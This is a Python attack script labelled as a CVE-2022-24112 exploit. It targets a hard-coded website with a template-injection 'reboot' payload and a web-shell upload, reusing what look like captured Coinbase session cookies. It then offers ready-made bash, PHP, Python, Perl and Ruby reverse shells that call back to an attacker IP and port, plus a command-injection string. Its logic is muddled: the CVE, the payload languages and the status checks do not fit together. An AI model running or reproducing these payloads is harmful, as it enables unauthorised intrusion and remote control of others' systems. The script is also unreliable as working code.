import requests
import sys
import threading
import argparse
import urllib3
import socket
import time
import random
import requests, sys, urllib, re
import datetime
from colorama import Fore, Back, Style

class color:
    HEADER = '\033[95m'
    IMPORTANT = '\33[35m'
    NOTICE = '\033[33m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    RED = '\033[91m'
    END = '\033[0m'
    UNDERLINE = '\033[4m'
    LOGGING = '\33[34m'
color_random=[color.HEADER,color.IMPORTANT,color.NOTICE,color.OKBLUE,color.OKGREEN,color.WARNING,color.RED,color.END,color.UNDERLINE,color.LOGGING]


def banner():
    run = color_random[6]+'''\n                                   .     ,
        _.._ * __*\./ ___  _ \./._ | _ *-+-
       (_][_)|_) |/'\     (/,/'\[_)|(_)| |
          |                     |
\n'''
    run2 = color_random[2]+'''\t\t(CVE-2022-24112)\n'''
    run3 = color_random[4]+'''{ Coded By: Ven3xy  | Github: https://github.com/M4xSec/ }\n\n'''
    print(run+run2+run3)

LINK = 'http://hiltonlocalbiz.com/'

ip = '192.168.4.7'

port = '4444'
file_name = random.randrange(1000)
#Create a new session
s = requests.Session() 

#Set Cookie
cookies = {'cb_dm': '0c055e89-df54-495f-80a4-c529dc18e48d'}
#Creating a PHP Web Shell

phpshell  = {
               'personImage': 
                  (
                   'kh4waja.php', 
                   '{% import os %}{{os.system("whoami")}}', 
                   '{% import os %}{{os.system("whoami")}}', 
                  {'Content-Disposition': 'form-data'}
                  ) 
             }



filename = 'kh4waja.php'
    
header= {
'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0',
'Accept': '*/*',
'Accept-Language': 'en-US,en;q=0.5',
'Accept-Encoding': 'gzip, deflate, br',
'Referer': 'https://profile.coinbase.com/',
'Content-Type': 'application/json',
'DNT': '1',
'Connection': 'keep-alive',
'Cookie': 'cb_dm=0c055e89-df54-495f-80a4-c529dc18e48d; coinbase_device_id=aa37f363-76db-4910-9ef0-0eab13c32fbe; _ga=GA1.2.1310880111.1684953236; __cf_bm=azcfmTplU1X01JUkNBVBsgoSzWhP9H9mm_UyRzurJjM-1685204853-0-AXifLxTLmlyGZ1OvEjNGRBdU44qG5U1DcN2Osmr6xSav1PsizbuATA5frDfHYv1K47J+DI6IOxP1rKiFK5XLJy0=; _gid=GA1.2.321768030.1685203474; coinbase_hide_download_cta=true',
'Sec-Fetch-Dest': 'empty',
'Sec-Fetch-Mode': 'cors',
'Sec-Fetch-Site': 'same-origin',
'TE': 'trailers'
}


# Defining value for form data
data = {"notifier":{"name":"Bugsnag JavaScript","version":"7.17.4","url":"https://github.com/bugsnag/bugsnag-js"},"device":{"locale":"en-US","userAgent":"Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0","orientation":"landscape-primary","id":"cli207e5f00002068qw2kodcb"},"app":{"releaseStage":"production","version":"1.0.0","type":"ens_profiles"},"sessions":[{"id":"cli67ium900012068j46kyme1","startedAt":"2023-05-27T16:29:21.921Z","user":{"id":"cli207e5f00002068qw2kodcb"}}]}

def webshell(LINK, session):
    try:
        WEB_SHELL = LINK+filename
        getdir  = {'cmd': 'echo %CD%'}
        r2 = session.get(WEB_SHELL,headers=header, params=getdir, verify=False)
        status = r2.status_code
        print(status)
        if status != 400:
            print (Style.BRIGHT+Fore.RED+"[!] "+Fore.RESET+"Could not connect to the webshell."+Style.RESET_ALL)
            r2.raise_for_status()
        print(Fore.GREEN+'[+] '+Fore.RESET+'Successfully connected to webshell.')
        cwd = re.findall('[CDEF].*', r2.text)
        cwd = cwd[0]+"> "
        term = Style.BRIGHT+Fore.GREEN+cwd+Fore.RESET
        while True:
            thought = input \
('''\033[1;37m
\n
1- Bash Reverse Shell \n
2- PHP Reverse Shell \n
3- Python Reverse Shell \n
4- Perl Reverse Shell \n
5- Ruby Reverse Shell \n
\033[1;m

\033[1;36mPlease insert the number Reverse Shell's type u want e.g. ( 1 ) > \033[1;m''')#input(term)
            if thought == '1':
                thought = 'mkfifo /tmp/'+str(file_name)+'; nc '+ip+' '+port+' 0</tmp/'+str(file_name)+' | /bin/sh >/tmp/'+str(file_name)+' 2>&1; rm /tmp/'+str(file_name)+''

            elif thought == '2':
                thought = ''' php -r '$sock=fsockopen("''' + ip + '''",''' + port + ''');exec("/bin/sh -i <&3 >&3 2>&3");' '''

            elif thought == '3':
                thought = ''' python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("''' + ip + '''",''' + port + '''));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' '''

            elif thought == '4':
                thought = ''' perl -e 'use Socket;$i="''' + ip + '''";$p=''' + port + ''';socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};' '''

            elif thought == '5':
                thought = ''' ruby -rsocket -e'f=TCPSocket.open("''' + ip + '''",''' + port + ''').to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)' '''
            elif thought == '6':
                thought = """%2 -n 21 127.0.0.1||`ping -c 21 127.0.0.1` #' |ping -n 21 127.0.0.1||`ping -c 21 127.0.0.1` #\" |ping -n 21 127.0.0.1"""
            else:
               print("\033[1;36m \n Please Re-Check ur input :( \033[1;m \n")
            command = {'cmd': thought}
            r2 = requests.post(WEB_SHELL,headers=header, params=command, verify=False)#,data=data
            status = r2.status_code
            print(status)
            if status != 403:
                r2.raise_for_status()
            response2 = r2.text
            print(response2)
    except:
        print("\r\nExiting.")
        sys.exit(-1)



#Uploading Reverse Shell
print("[*]Uploading PHP Shell For RCE...")
upload = s.get(LINK+'%7B%25%20import%20os%20%25%7D%7B%7Bos.system(%27reboot%27)%7D%7D',headers=header, cookies=cookies, files=phpshell)
print(upload,upload.text)
shell_upload = True if("" in upload.text) else False
u=shell_upload
if u:
	print("[+]PHP Shell has been uploaded successfully!")
else:
	print("[-]Failed To Upload The PHP Shell!")



#Executing The Webshell
webshell(LINK, s)
